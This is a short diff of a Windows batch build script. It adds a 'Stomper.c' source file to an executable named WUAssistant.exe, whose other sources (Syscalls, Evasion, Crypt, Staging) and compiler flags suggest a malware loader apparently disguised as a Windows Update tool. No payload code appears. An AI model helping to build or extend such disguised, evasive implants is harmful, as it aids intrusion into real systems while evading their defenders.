@@ -14,7 +14,7 @@ IF "%VSTOOLS%"=="" ( echo [!] VS not found. & exit /b 1 )
 call "%VSTOOLS%" >nul 2>&1
 
 SET OUTNAME=WUAssistant.exe
-SET CFILES=main.c Syscalls.c WinApi.c Evasion.c Crypt.c Staging.c
+SET CFILES=main.c Syscalls.c WinApi.c Evasion.c Crypt.c Staging.c Stomper.c
 SET CFLAGS=/O1 /GS- /W0 /std:c17 /nologo
 SET LFLAGS=/NODEFAULTLIB /ENTRY:Main /SUBSYSTEM:WINDOWS kernel32.lib user32.lib
 
